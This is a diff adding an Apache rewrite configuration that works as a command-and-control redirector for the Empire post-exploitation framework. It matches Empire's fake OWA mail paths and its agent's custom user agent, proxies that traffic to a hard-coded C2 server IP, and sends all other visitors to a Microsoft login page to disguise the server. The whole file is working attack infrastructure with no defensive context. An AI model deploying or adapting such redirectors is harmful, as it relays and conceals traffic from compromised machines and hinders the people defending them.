@@ -1,0 +1,13 @@
+RewriteEngine On
+
+#URL condition – Empire’s url structure
+RewriteCond %{REQUEST_URI} ^/(owa/mail/inbox.srf|owa/mail/drafts.srf|owa/mail/archive.srf)/?$
+
+#UserAgent condition – Empire agent’s custom user agent
+RewriteCond %{HTTP_USER_AGENT} ^Mozilla/5\.0\ \(Windows\ NT\ 6\.1;\ WOW64;\ Trident/7\.0;\ yie11;\ rv:11\.0\)\ like\ Gecko?$
+
+#Redirect the original C2 traffic to this host
+RewriteRule ^.*$ http://134.209.82.207%{REQUEST_URI} [P]
+
+# Redirect all other traffic here
+RewriteRule ^.*$ https://login.microsoftonline.com/? [L,R=302]
